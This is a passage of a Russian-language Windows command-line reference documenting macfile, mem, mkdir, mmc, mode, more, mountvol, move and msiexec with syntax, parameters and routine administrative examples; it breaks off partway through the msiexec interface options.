- Если аргументы параметров команды содержат пробелы или специальные знаки, их следует заключать в кавычки (например "имя компьютера").- Команда macfile directory используется, чтобы сделать доступной для пользователей «Макинтоша» существующую папку на томе, также доступном для «Макинтоша». Команда macfile directory не создает папки. Перед тем как обратиться к команде macfile directory, воспользуйтесь диспетчером файлов, командной строкой или командой macintosh new folder для создания папки на томе, доступном для «Макинтоша».
Примеры

В следующем примере показано изменение разрешений для подпапки «May sales» на томе «Statistics», доступном для «Макинтоша» на диске E локального сервера. Назначаются разрешения на просмотр файлов, просмотр папок и внесение изменений для владельца и на просмотр файлов и папок для всех остальных. При этом папки остаются защищенными от переименования, перемещения и удаления.

macfile directory /path:"e:\statistics\may sales" /permissions:11111011000

Объединение данных файла «Макинтоша» и компонентов ресурсов
Синтаксис

macfile forkize [/server:\\имя_компьютера] [/creator:имя_источника] [/type:имя_типа] [/datafork:путь_к_файлу] [/resourcefork:путь_к_файлу] /targetfile:путь_к_файлу
Параметры

/server:\\имя_компьютера
    Сервер, на котором будут объединены файлы. Если данный параметр не задан, операция выполняется на локальном компьютере.
/creator:имя_источника
    Источник файла. Программа Macintosh Finder использует параметр командной строки /creator для определения приложения, создавшего файл.
/type:имя_типа
    Тип файла. Программа Macintosh Finder использует параметр командной строки /type для определения типа файла в приложении, создавшем файл.
/datafork:путь_к_файлу
    Размещение файла данных, предназначенного для объединения. Допускается указание пути к файлу на удаленном компьютере.
/resourcefork:путь_к_файлу
    Размещение файла ресурсов, предназначенного для объединения. Допускается указание пути к файлу на удаленном компьютере.
/targetfile:путь_к_файлу
    Обязательный параметр. Размещение файла, созданного путем объединения файла данных и файла ресурсов, или файла, тип и источник которого изменены. Этот файл должен находиться на указанном сервере.
/?
    Отображение справки в командной строке.

Заметки
- Если аргументы параметров команды содержат пробелы или специальные знаки, их следует заключать в кавычки (например "имя компьютера").
Примеры

Чтобы создать файл Treeapp на доступном для «Макинтоша» томе «D:\Release» из файла ресурсов «C:\Cross\Mac\Appcode» и настроить отображение файла на экране клиентов «Макинтоша» как приложения (приложения для «Макинтоша» используют тип APPL) с источником (подписью) MAGNOLIA, введите:

macfile forkize /resourcefork:c:\cross\mac\appcode /type:APPL /creator:MAGNOLIA /targetfile:D:\Release\Treeapp

Чтобы сменить источник файла на Microsoft Word 5.1 для файла WORD.txt в папке «D:\Word documents\Group files» на сервере \\SERVERA, введите:

macfile forkize /server:\\servera /creator:MSWD /type:TEXT /targetfile:"d:\Word documents\Group files\Word.txt"

Изменение сообщения при входе и ограничение сеансов
Синтаксис

macfile server [/server:\\имя_компьютера] [/maxsessions:{число| unlimited}] [/loginmessage:сообщение]
Параметры

/server:\\имя_компьютера
    Сервер, на котором будут изменены параметры. Если этот параметр не задан, операция выполняется на локальном компьютере.
/maxsessions:[число| unlimited]
    Максимальное количество пользователей, которые могут одновременно использовать серверы файлов и печати для «Макинтоша». Если данный параметр не задан, значение maxsessions для сервера не изменяется.
/loginmessage:сообщение
    Смена сообщения, которое пользователи «Макинтоша» увидят при входе на файловый сервер для «Макинтоша». Максимальное количество знаков сообщения при входе — 199. Если данный параметр не задан, сообщение loginmessage этого сервера не изменяется. Чтобы удалить существующее сообщение при входе, воспользуйтесь параметром /loginmessage, оставив сообщение пустым.
/?
    Отображение справки в командной строке.

Заметки
- Если аргументы параметров команды содержат пробелы или специальные знаки, их следует заключать в кавычки (например "имя компьютера").
Примеры

Для изменения количества сеансов файлового сервера и сервера печати для «Макинтоша», разрешенных на локальном сервере, с текущего значения на пять сеансов и добавления сообщения «Выйдите из сервера для Macintosh после окончания работы», введите:

macfile server /maxsessions:5 /loginmessage:"Выйдите из сервера для Macintosh после окончания работы"

Добавление, изменение и удаление тома, доступного для Macintosh
Синтаксис

macfile volume {/add | /set} [/server:\\имя_компьютера] /name:имя_тома /path:папка [/readonly:{true | false}] [/guestsallowed:{true | false}] [/password:пароль] [/maxusers:{число| unlimited}]

macfile volume /remove [/server:\\имя_компьютера] /name:имя_тома
Параметры

{/add | /set}
    Обязателен при добавлении или изменении тома, доступного для «Макинтоша». Добавление или изменение указанного тома.
/server:\\имя_компьютера
    Сервер, на котором следует добавить, изменить или удалить том. Если данный параметр не задан, операция выполняется на локальном компьютере.
/name:имя_тома
    Обязательный параметр. Имя добавляемого, изменяемого или удаляемого тома. 
/path:папка
    Требуется и используется только при добавлении тома. Путь к корневой папке добавляемого тома. 
/readonly:[true | false]
    Разрешение изменения файлов этого тома пользователями. Значение true запрещает изменение файлов на этом томе пользователями. Значение false разрешает изменение файлов на этом томе пользователями. Если при создании тома этот параметр не задан, изменение файлов разрешено. Если при изменении тома этот параметр опущен, режим readonly для тома не изменяется.
/guestsallowed:{true | false}
    Управление доступом к тому пользователей, вошедших в систему как гости. Значение true разрешает использование этого тома гостями. Значение false запрещает использование этого тома гостями. Если при добавлении тома этот параметр не задан, гости имеют доступ к тому. Если при изменении тома этот параметр не задан, состояние guestsallowed для тома не изменяется.
/password:пароль
    Пароль, который будет требоваться для доступа к тому. Если при создании тома этот параметр не задан, пароль не создается. Если при изменении тома этот параметр не задан, предыдущий пароль не меняется.
/maxusers:[число| unlimited]
    Максимальное количество пользователей, одновременно получающих доступ к тому. Если при добавлении тома этот параметр не задан, одновременно к тому может обращаться любое количество пользователей. Если при изменении тома этот параметр не задан, предыдущее значение maxusers не меняется.
/remove
    Обязательный параметр при удалении тома, доступного для «Макинтоша». Удаление указанного тома.
/?
    Отображение справки в командной строке.

Заметки
- Если аргументы параметров команды содержат пробелы или специальные знаки, их следует заключать в кавычки (например "имя компьютера").
Примеры

Чтобы создать том «US Marketing Statistics» на локальном сервере, используя папку Stats на диске E, и запретить доступ к нему гостям, введите:

macfile volume /add /name:"US Marketing Statistics" /guestsallowed:false /path:e:\Stats

Чтобы сделать том, созданный выше, доступным только для чтения, задать пароль на доступ к нему и ограничить максимальное количество пользователей пятью, введите:

macfile volume /set /name:"US Marketing Statistics" /readonly:true /password:saturn /maxusers:5

Чтобы добавить том «Landscape Design» на сервер \\Magnolia, используя папку Trees на диске E, и разрешить доступ гостей к нему, введите:

macfile volume /add /server:\\Magnolia /name:"Landscape Design" /path:e:\Trees

Чтобы удалить том «Sales Reports» с локального сервера, введите:

macfile volume /remove /name:"Sales Reports"
========================================================================================
Mem

Служит для вывода сведений о свободных и занятых областях памяти и программах, находящихся в памяти подсистемы MS-DOS. При запуске команды mem без параметров на экран выводятся сведения о свободной и об использованной памяти подсистемы MS-DOS.
Синтаксис

mem [{/program | /debug | /classify}]
Параметры

/program
    Вывод сведений о загруженных в память программах. 
/debug
    Вывод сведений о загруженных программах и внутренних драйверах, а также других сведений.. 
/classify
    Вывод сведений о программах, загруженных в обычную память и в верхнюю область памяти. 
/?
    Отображение справки в командной строке.

Заметки
- Использование параметра /program

Параметр /program нельзя использовать совместно с параметром /debug или /classify. Допускается использование сокращения /p вместо /program.
- Использование параметра /debug

Параметр /debug нельзя использовать совместно с параметром /program или /classify. Допускается использование сокращения /d вместо /debug.
- Использование параметра /classify

Параметр /classify обеспечивает вывод сведений о размере каждой программы в десятичном и шестнадцатеричном формате, итоговые сведения об использовании памяти и список наибольших доступных блоков памяти. Параметр /classify нельзя использовать совместно с параметром /program или /debug. Допускается использование сокращения /c вместо /classify.
- Вывод сведений о состоянии памяти

Подсистема MS-DOS выводит сведения о состоянии расширенной памяти, только если в память загружено что-либо по адресам выше 1 МБ.
Примеры

Предположим, подсистема MS-DOS сконфигурирована так, что используется расширенная память. Для вывода сведений об использовании всех областей памяти — обычной, расширенной и отображаемой, а также для вывода сведений о загруженных программах следует использовать следующую команду:

mem /program

Результат будет выглядеть примерно следующим образом:


Адрес Имя Размер Тип000000 000400 Вектор прерывания
000400 000100 Область обмена ПЗУ (ROM)
000500 000200 Область обмена DOS

000700 IO 000310 Системные данные

000A10 MSDOS 0014D0 Системные данные

001EE0 IO 0018D0 Системные данные
 KBD 000800 Системная программа
 HIMEM 000420 DEVICE=
 000340 FILES=
 000090 FCBS=
 000170 LASTDRIVE=
 000710 STACKS=
0037C0 COMMAND 000A40 Программа
004210 MSDOS 000070 - Свободно -
004290 COMMAND 0001F0 Окружение
004490 MEM 0001D0 Окружение
004670 MEM 017550 Программа
01BBD0 MSDOS 084410 - Свободно -
09FFF0 SYSTEM 028000 Системная программа

0C8000 IO 0083D0 Системные данные
 MOUSE 0083C0 Системная программа
0D03E0 MSDOS 000050 - Свободно -
0D0440 REDIR 0009F0 Программа
0D0E40 DOSX 007CA0 Программа
0D8AF0 DOSX 001030 Данные
0D9B30 MSDOS 0164C0 - Свободно -


 655360 байт - всего обычной памяти
 655360 байт - доступно для MS-DOS
 637296 максимальный размер исполняемой программы

1048576 байт - всего непрерывной дополнительной памяти
 0 байт - доступно непрерывной дополнительной памяти
 405504 байт - доступной памяти XMS
 резидентная часть MS-DOS загружена в сегмент HMA

- «Всего обычной памяти» представляет количество виртуальной памяти, выделенной подсистеме MS-DOS до первых 640 КБ.- «Доступно для MS-DOS» представляет объем выделенной обычной памяти, включая память, необходимую для Cmd.exe. - «Максимальный размер исполняемой программы» равен размеру наибольшего непрерывного блока обычной памяти, доступной для программ. - «Всего памяти EMS» (не показано в предыдущем примере) является количеством отображаемой памяти, которая может быть использована подсистемой MS-DOS.- «Свободно памяти EMS» (не показано в предыдущем примере) равно количеству отображаемой памяти, доступной программам. - «Всего непрерывной дополнительной памяти» равно объему памяти выше 1 МБ.- «Доступно непрерывной дополнительной памяти» является количеством памяти, доступным через интерфейс прерывания 15h. Эта память не используется диспетчерами расширенной памяти, такими как Himem.sys. Некоторые старые программы используют такую схему организации дополнительной памяти.- «Доступной памяти XMS» является объемом памяти, которая используется диспетчерами расширенной памяти, такими как Himem.sys, и доступна для использования программами. ========================================================================================
Mkdir

Создание папки или подпапки.
Синтаксис

mkdir [диск:]путь

md [диск:]путь
Параметры

диск:
    Диск, на котором будет создана новая папка.
путь
    Обязательный параметр. Имя и местоположение новой папки. Максимальная длина пути определяется типом файловой системы.
/?
    Отображение справки в командной строке.

Заметки
- Если расширения командного процессора разрешены (по умолчанию они разрешены), с помощью одной команды mkdir можно создать все вложенные папки по указанному пути. Дополнительные сведения о расширениях командного процессора см. в разделе cmd, доступном по ссылке «».
Примеры

Чтобы создать папку Налоги с подпапкой Ставки, содержащей папку Текущие, введите:

mkdir \Налоги\Ставки\Текущие

Данная команда аналогична использованию следующей последовательности команд (если разрешения командного процессора запрещены):
mkdir \Налоги
chdir \Налоги
mkdir Ставки
chdir Ставки
mkdir Текущие 
========================================================================================
Mmc

Служит для открытия окна консоли MMC. Используя параметры командной строки mmc, можно открывать определенную консоль MMC, открывать консоль MMC в авторском режиме и выбирать запускаемую версию консоли: 32-разрядную или 64-разрядную.
Синтаксис

mmc путь\имя_файла.msc [/a] [/64] [/32]
Параметры

путь\имя_файла.msc
    Запуск консоли MMC с открытием сохраненной консоли. Необходимо указать полный путь и имя файла сохраненной консоли. Если файл консоли не указан, будет открыта новая консоль MMC.
/a
    Открытие сохраненной консоли в авторском режиме. Используется для внесения изменений в сохраненные консоли.
/64
    Открытие 64-разрядной версии консоли MMC (MMC64). Этот параметр следует использовать только при работе в Windows XP 64-Bit Edition. 
/32
    Открытие 32-разрядной версии консоли MMC (MMC32). При работе в Windows XP 64-Bit Edition в окне консоли MMC, запущенной с этим параметром, можно открывать 32-разрядные оснастки.
/?
    Отображение справки в командной строке.

Заметки
- Использование параметра командной строки путь\имя_файла.msc

Для создания командных строк и ярлыков, которые не зависят от явного расположения файлов консоли, можно использовать переменные среды. Например, если путь к файлу консоли включает системную папку (например, mmc c:\winnt\system32\console_name.msc), то для указания пути можно использовать переменную %systemroot%: (mmc %systemroot%\system32\console_name.msc). Это полезно при делегировании заданий пользователям, работающим на разных компьютерах.
- Использование параметра командной строки /a

Когда консоли открываются с этим параметром, они открываются в авторском режиме, независимо от режима, используемого по умолчанию. Используемый по умолчанию режим файла при этом не меняется. Без этого параметра файлы будут открываться в соответствии со своими параметрами.
- После открытия консоли MMC или файла консоли любая существующая консоль открывается с помощью команды Открыть из меню Консоль. - С помощью командной строки можно создавать ярлыки для запуска консоли MMC и работы с сохраненными консолями. Команда для командной строки работает в окне команды Выполнить из меню Пуск, в любом окне командной строки, в ярлыках, в пакетных файлах и программах, вызывающих такие команды. ========================================================================================
Mode

Служит для отображения состояния и изменения параметров системы, а также перенастройки портов или устройств. При вызове команды mode без параметров отображаются все изменяемые атрибуты консоли и доступные COM-устройства. Поскольку команда mode служит для выполнения многих задач, для каждой такой задачи следует использовать индивидуальный синтаксис. Выберите задачу, которую требуется выполнить.

Задание параметров последовательного порта
Синтаксис

mode comm[:] [baud=b] [parity=p] [data=d] [stop=s] [to={on|off}] [xon={on|off}] [odsr={on|off}] [octs={on|off}] [dtr={on|off|hs}] [rts={on|off|hs|tg}] [idsr={on|off}]
Параметры

comm [:]
    Номер порта асинхронной связи.
baud=b
    Скорость передачи в битах в секунду. В следующем списке приведены допустимые значения параметра b и соответствующие им скорости.
    Значение     Скорость
    11     110 бод
    15     150 бод
    30     300 бод
    60     600 бод
    12     1200 бод
    24     2400 бод
    48     4800 бод
    96     9600 бод
    19     19 200 бод
parity=p
    Режим проверки ошибок передачи. В следующей таблице приведен список допустимых значений p. По умолчанию используется значение e. Не все компьютеры поддерживают значения m и s.
    Значение     Описание
    n     нет
    e     чет (even)
    o     нечет (odd)
    m     пометка (mark)
    s     пробел (space)
data=d
    Число битов данных в символе. Допустимые значения d находятся в диапазоне от 5 до 8. Значение по умолчанию равно 7. Не все компьютеры поддерживают значения 5 и 6.
stop=s
    Число стоповых битов, определяющих конец символа: 1, 1,5 или 2. Если скорость передачи равна 110, по умолчанию используется значение 2. В противном случае используется значение 1. Не все компьютеры поддерживают значение 1,5.
to={on|off}
    Режим обработки бесконечных пауз передачи. По умолчанию режим отключен (off).
xon={on|off}
    Режим использования протокола xon/xoff для управления передачей.
odsr={on|off}
    Включение или отключение согласования выходов с использованием сигнала Data Set Ready (DSR).
octs={on|off}
    Включение или отключение согласования выходов с использованием сигнала Clear To Send (CTS).
dtr={on|off|hs}
    Режим использования сигнала готовности терминала данных (DTR). Возможные значения: on (включено), off (отключено), handshake (согласование).
rts={on|off|hs|tg}
    Режим использования сигнала Request To Send (RTS). Возможные значения: on (включено), off (отключено), handshake (согласование) и toggle (переключение).
idsr={on|off}
    Режим использования распознавания сигнала DSR.
/?
    Отображение справки в командной строке.

Вывод сведений обо всех внешних устройствах либо о заданном устройстве
Синтаксис

mode [устройство] [/status]
Параметры

устройство
    Имя устройства, сведения о котором будут выведены.
/status
    Запрос сведений о состоянии перенаправленного параллельного принтера. Допускается использование сокращения /sta вместо /status.
/?
    Отображение справки в командной строке.

Заметки
- Запущенная без параметров, команда mode выводит информацию о состоянии всех внешних устройств системы.

Перенаправление вывода с параллельного порта на последовательный
Синтаксис

mode lptn[:]=comm[:]
Параметры

lptn
    Обязательный параметр. Параллельный порт. Допустимые значения n находятся в диапазоне от 1 до 3. 
comm [:]
    Обязательный параметр. Последовательный порт. Допустимые значения m находятся в диапазоне от 1 до 4.
/?
    Отображение справки в командной строке.

Заметки
- Для перенаправления вывода на печать необходимо быть членом группы «Администраторы».
Примеры

Чтобы перенаправить на локальном компьютере вывод с параллельного порта на последовательный, необходимо вызвать команду mode дважды. Первая команда mode конфигурирует последовательный порт. Вторая команда mode перенаправляет вывод параллельного принтера на последовательный порт, указанный в первой команде mode.

Например, если последовательный принтер работает со скоростью 4800 бод с контролем передачи по четности и подключен к порту COM1 (первое последовательное устройство компьютера), следует использовать следующие две команды:

mode com1 48,e,,,b
mode lpt1=com1

Если вывод принтера был перенаправлен с порта LPT1 на порт COM1, но затем было решено напечатать файл на принтере, подключенном к порту LPT1, перед печатью необходимо вызвать следующую команду.

mode lpt1

Эта команда предотвращает перенаправление файла с порта LPT1 на порт COM1.

Выбор, обновление или вывод номера кодовой страницы, используемой в окне командной строки
Синтаксис

mode устройство codepage select=yyy

mode устройство codepage [/status]
Параметры

устройство
    Обязательный параметр. Устройство, для которого выбирается кодовая страница. CON является единственным допустимым значением.
codepage select=
    Обязательный параметр. Кодовая страница, используемая с заданным устройством. Допускается использование сокращений cp и sel вместо codepage и select соответственно.
yyy
    Обязательный параметр. Номер выбираемой кодовой страницы. Ниже приведены существующие кодовые таблицы с соответствующими странами/регионами или языками:
    Значение     Страна/регион
    437     США
    850     Многоязычная (латиница I)
    852     Восточная и центральная Европа (латиница II)
    855     Кириллица (русский)
    857     Турецкий
    860     Португальский
    861     Исландский
    863     Французский (Канада)
    865     Скандинавский
    866     Русский
    869     Современный греческий
codepage
    Обязательный параметр. Вывод номеров кодовых страниц, выбранных для заданного устройства.
/status
    Вывод номеров кодовых страниц, выбранных для данного устройства. Допускается использование сокращения /sta вместо /status. Независимо от того, задан ли параметр /status, команда mode codepage выводит номера кодовых страниц, выбранных для заданного устройства. 
/?
    Отображение справки в командной строке.

Изменение размера курсора командной строки
Синтаксис

mode con[:] [cols=c] [lines=n]
Параметры

con[:]
    Обязательный параметр. Указывает на изменения в окне командной строки.
cols=c
    Число символов (столбцов), определяющих ширину буфера экрана.
lines=n
    Число строк, определяющих длину буфера экрана.
/?
    Отображение справки в командной строке.

Задание частоты повторений знаков с клавиатуры
Синтаксис

mode con[:] [rate=r delay=d]
Параметры

con[:]
    Обязательный параметр. Задает установку параметра для клавиатуры.
rate=r
    Частота повторений вывода знака на экран при нажатии и удержании клавиши.
delay=d
    Промежуток времени, после которого нажатая и удерживаемая клавиша начинает повторять знаки.
/?
    Отображение справки в командной строке.

Заметки
-Частота повторений — это частота, с которой знак повторно вводится с клавиатуры при удержании соответствующей клавиши. Параметр состоит из двух частей: частоты повторений и задержки повторения. Некоторые клавиатуры не распознают эту команду. - Использование параметра rate=r

Допустимые значения — от 1 до 32. Эти величины приблизительно соответствуют повторению от 2 до 30 знаков в секунду соответственно. Значение по умолчанию равно 20 для клавиатур, совместимых с IBM AT, и 21 для клавиатур, совместимых с IBM PS/2. Если установлена частота повторений, необходимо установить и задержку.
- Использование параметра delay=d

Допустимые значения параметра d — 1, 2, 3 и 4 (0,25 секунды, 0,50 секунды, 0,75 секунды и 1 секунда соответственно). Значение по умолчанию равно 2. При установке задержки также должна быть задана и частота повторений.
========================================================================================
More

Служит для поэкранного вывода информации.
Синтаксис

команда | more [/c] [/p] [/s] [/tn] [+n]

more [[/c] [/p] [/s] [/tn] [+n]] < [диск:] [путь] имя_файла

more [/c] [/p] [/s] [/tn] [+n] [файлы]
Параметры

[диск:] [путь] имя_файла
    Файл, который будет выведен на экран.
команда
    Команда, которая будет выводить на экран какие-либо сведения.
/c
    Очистка экрана перед выводом страницы.
/p
    Обработка символов перевода страницы.
/s
    Замена нескольких пустых строк одной.
/tn
    Замена знаков табуляции количеством пробелов, заданным значением n.
+n
    Вывод первого файла, начиная со строки n.
файлы
    Список файлов для вывода. Имена файлов разделяются пробелами.
/?
    Отображение справки в командной строке.

Заметки
- Использование команды more в консоли восстановления

Команда more с другими параметрами доступна в консоли восстановления.
- Использование клавиш по время работы команды more

В ответ на приглашение команды more (-- More --) можно нажимать следующие клавиши.
Клавиша     Действие
ПРОБЕЛ     Вывод следующей страницы
ENTER     Вывод следующей строки
f     Вывод следующего файла
q     Выход
?     Вывод списка команд
=     Вывод номеров строк
p n     Вывод следующих n строк
s n     Пропуск следующих n строк
- Задание источника данных

Когда используется символ перенаправления (<), в качестве источника данных для команды должно быть указано имя файла. В командах dir, sort или type можно использовать знак «|».
Примеры

Для просмотра на экране файла Clients.new может быть использована любая из следующих двух команд:

more < clients.new

type clients.new | more

Команда more выводит первый экран из файла Clients.new и следующее приглашение:

-- More --

Для продолжения просмотра может быть нажата клавиша ПРОБЕЛ.

Для очистки экрана и удаления лишних пустых строк перед выводом файла Clients.new может быть использована любая из следующих команд:

more /c /s < clients.new

type clients.new | more /c /s

Команда more выводит первый экран из файла Clients.new и следующее приглашение:

-- More --

Для построчного вывода файла необходимо нажать ENTER.

Для вывода следующего экрана необходимо нажать ПРОБЕЛ.

Для вывода следующего файла из списка требуется ввести f.

Для выхода из программы more нажмите клавишу q.

В ответ на запрос команды more можно нажимать клавиши, рассмотренные в этом примере:

-- More [Параметры: psfq=<пробел><ENTER>] --

Чтобы вывести номер текущей строки, нажмите клавишу =. Номер строки будет добавлен к приглашению more, как показано ниже:

-- More [Строка: 24] --

Чтобы вывести определенное количество строк, нажмите клавишу p. Будет запрошено количество строк, которое требуется вывести:

-- More -- Строки:

Теперь требуется ввести число и нажать клавишу ENTER. На экран будет выведено заданное число строк.

Чтобы пропустить определенное количество строк, нажмите клавишу s. Будет запрошено количество строк, которое требуется пропустить:

-- More -- Строки:

Следует ввести число и нажать клавишу ENTER. Будет пропущено заданное количество строк файла и продолжен вывод информации.
========================================================================================
Mountvol

Служит для создания, удаления и получения списка точек подключения тома. Команда Mountvol является обеспечивает подключение томов, не требуя для этого букву диска.
Синтаксис

mountvol [диск:]путь имя_тома

mountvol [диск:]путь /d

mountvol [диск:]путь /L

mountvol диск: /s
Параметры

[диск:]путь
    Папка существующего каталога NTFS, в которой находится точка подключения.
имя_тома
    Имя тома, являющегося местом назначения точки подключения. Имя тома задается в формате \\?\Volume{код_GUID}\, где {код_GUID} является глобальным уникальным идентификатором (GUID) (например \\?\Volume\{2eca078d-5cbc-43d3-aff8-7e8511f60d0e}\).
/d
    Удаление точки подключения из указанной папки.
/L
    Вывод списка имен подключенных дисков для указанной папки.
/s
    Только для компьютеров на основе процессора Itanium. Подключение системного раздела EFI к указанному диску.
/?
    Отображение справки в командной строке.

Заметки
- Если свободные буквы дисков отсутствуют, подключите локальные тома без использования букв дисков.- Если требуется увеличить свободное место на томе, не форматируя и не меняя жесткий диск, можно подключить к какому-либо его пути другой том.- Выгода использования одного тома с несколькими путями присоединения состоит в возможности использования всех локальных дисков с помощью одного имени диска (например C:). Отпадает необходимость помнить соответствие томов и имен дисков, хотя можно и присоединить локальные тома, и по-прежнему использовать имена дисков. ========================================================================================
Move

Служит для перемещения одного или нескольких файлов из одного каталога в другой.
Синтаксис

move [{/y|/-y}] [источник] [результат]
Параметры

/y
    Запрет на выдачу запроса подтверждения перезаписи существующего файла-результата.
/-y
    Выдача запроса подтверждения перезаписи существующего файла-результата.
источник
    Путь и имя одного или нескольких файлов для перемещения. Если требуется переместить или переименовать каталог, в качестве источника должен быть указан путь к текущему каталогу и его имя.
результат
    Путь и имя, куда требуется переместить файлы. Если требуется переместить или переименовать каталог, в качестве результата должен быть указан путь к конечному каталогу и его имя.
/?
    Отображение справки в командной строке.

Заметки
- Использование параметра командной строки /y

Параметр командной строки /y может быть установлен заранее в переменной среды COPYCMD. Значение может быть переопределено параметром /-y в командной строке. По умолчанию если команда copy выполняется не в пакетной программе, при замене требуется подтверждение.
- Перемещение зашифрованных файлов

При перемещении файлов на том, не поддерживающий шифрованную файловую систему (EFS), возникнет ошибка. Следует предварительно расшифровать файлы или переместить их на том, поддерживающий EFS.
Примеры

Чтобы переместить все файлы с расширением XLS из каталога \Data в каталог \Second_Q\Reports, введите:

move \data\*.xls \second_q\reports\
========================================================================================
Msiexec

Средство установки, изменения и выполнения операций установщика Windows из командной строки.

Установка и настройка продукта
Синтаксис

msiexec /i {пакет|код_продукта}
Параметры

/i
    Установка или настройка продукта.
пакет
    Имя файла пакета установщика Windows.
код_продукта
    Глобальный уникальный идентификатор (GUID) пакета установщика Windows.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Чтобы установить продукт из файла A:\Example.msi, введите:

msiexec /i A:\Example.msi

Использование режима административной установки
Синтаксис

msiexec /a пакет
Параметры

/a
    Выбор режима административной установки.
пакет
    Имя файла пакета установщика Windows.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».

Восстановление продукта
Синтаксис

msiexec /f [p][o][e][d][c][a][u][m][s][v]{пакет|код_продукта}
Параметры

/f
    Включение одного или нескольких параметров командной строки, перечисленных в следующей таблице.
    Параметр     Описание
    p     Переустановка только в случае отсутствия файла.
    o     Переустановка при отсутствии файла или если установлена его старая версия.
    e     Переустановка при отсутствии файла или если установлена его текущая либо старая версия.
    d     Переустановка в случае отсутствия файла или если установлена другая его версия.
    c     Переустановка в случае отсутствия файла или в случае, если контрольная сумма не совпадает с вычисленным значением.
    a     Принудительная переустановка всех файлов.
    u     Перезапись всех необходимых пользовательских записей реестра.
    m     Перезапись всех необходимых записей реестра компьютера.
    s     Перезапись всех имеющихся ярлыков.
    v     Запуск файлов из источника и повторное кэширование локального пакета.
пакет
    Имя файла пакета установщика Windows.
код_продукта
    Глобальный уникальный идентификатор (GUID) пакета установщика Windows.

Заметки
- Пропуск всех значений свойств, заданных в командной строке.- Параметром по умолчанию для этой командной строки является параметр /fpecms.- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Чтобы восстановить пакет установки, введите:

msiexec /fpecms Example.msi

Удаление продукта
Синтаксис

msiexec /x {пакет|код_продукта}
Параметры

/x
    Удаление продукта.
пакет
    Имя файла пакета установщика Windows.
код_продукта
    Глобальный уникальный идентификатор (GUID) пакета установщика Windows.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Чтобы удалить или отменить установку пакета, введите:

msiexec /x Example.msi

Объявление продукта
Синтаксис

msiexec /j [{u|m}] пакет

msiexec {u|m} пакет /t список_преобразований

msiexec {u|m} пакет /g код_языка
Параметры

/j
    Объявление продукта.
u
    Объявление для текущего пользователя.
m
    Объявление для всех пользователей компьютера.
пакет
    Файл пакета установщика Windows. 
/g код_языка
    Служит для задания языка.
/t список_преобразований
    Применение преобразований к объявляемому пакету.

Заметки
- Пропуск всех значений свойств, заданных в командной строке.- При необходимости установить приложение с повышенными привилегиями используйте параметр /jm.- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Чтобы объявить пакет для всех пользователей этого компьютера, введите:

msiexec /jm Example.msi

Чтобы объявить пакет для всех пользователей этого компьютера, введите:

msiexec /jm Example.msi

Установка уровня ведения журнала
Синтаксис

msiexec /L [i][w][e][a][r][u][c][m][p][v][+][!]файл_журнала.txt
Параметры

/L
    Путь к файлу журнала.
i
    Занесение в журнал сообщений о состоянии. 
w
    Занесение в журнал некритических предупреждений.
e
    Занесение в журнал сообщений об ошибках.
a
    Занесение в журнал выполнения действий.
r
    Занесение в журнал записей со сведениями о действиях.
u
    Занесение в журнал запросов пользователей.
c
    Занесение в журнал исходных параметров пользовательского интерфейса.
m
    Занесение в журнал нехватки памяти.
p
    Занесение в журнал свойств терминала.
v
    Занесение в журнал подробных сведений. Для использования параметра v следует задавать /L*v.
+
    Добавление в существующий файл.
!
    Сброс в журнал каждой строки.
*
    Занесение в журнал всех сведений, кроме параметра v. Это подстановочный знак.
файл_журнала.txt
    Имя и путь к текстовому файлу журнала.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Чтобы включить в файл журнала параметр v при использовании подстановочного знака, введите в командной строке /L*v.- Параметры файла журнала установщика Windows могут также использоваться для процессов удаления и восстановления.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».
Примеры

Чтобы установить пакет и создать файл журнала, включающий в себя сведения о состоянии, сообщения о нехватке памяти и все сообщения об ошибках, введите следующую команду:

msiexec /i Example.msi /Lime logfile.txt

Применение исправления
Синтаксис

msiexec /p пакет_исправлений
Параметры

/p
    Применение исправлений.
пакет_исправлений
    Определенное исправление.

Заметки
- Чтобы применить исправления к установочному административному пакету, введите следующую строку:

msiexec /p пакет_исправлений /a Example.msi
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».

Установка преобразования с использованием командной строки
Синтаксис

msiexec /i пакетTRANSFORMS=список_преобразований
Параметры

/i
    Установка или настройка продукта.
пакет
    Файл пакета установщика Windows.
TRANSFORMS=
    Свойство, используемое для указания файлов преобразования (MST), которые следует применить к пакету.
список_преобразований
    Список путей, разделенных точкой с запятой.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».

Установка и объявление продукта с преобразованием при помощи командной строки
Синтаксис

msiexec /i пакет /j[u][m] /t список_преобразований
Параметры

/i
    Установка или настройка продукта.
пакет
    Имя файла пакета установщика Windows.
/j
    Объявление продукта. Этот параметр игнорирует любые значения свойств, введенные в командной строке.
u
    Объявление для текущего пользователя.
m
    Объявление для всех пользователей данного компьютера.
/t
    Применение преобразований к объявляемому пакету.
список_преобразований
    Список путей, разделенных точкой с запятой.

Заметки
- Регистр букв при вводе параметров командной строки установщика Windows не учитывается.- Для получения дополнительных сведений о параметрах командной строки установщика Windows щелкните ссылку «».

Задание уровня пользовательского интерфейса
Синтаксис

msiexec /q{n|b|r|f|n+|b+|b-}
Параметры

/qn
    Запрет на отображение пользовательского интерфейса.
/qb
    Отображение основного пользовательского интерфейса.
/qr
    Отображение сокращенного пользовательского интерфейса с выводом модального диалогового окна в конце установки.
/qf
    Отображение полного пользовательского интерфейса с выводом модального диалогового окна в конце.
/qn+
    Запрет на отображение пользовательского интерфейса за исключением вывода модального диалогового окна в конце.
/qb+
    Отображение основного пользовательского интерфейса с выводом модального диалогового окна в конце.
/qb-
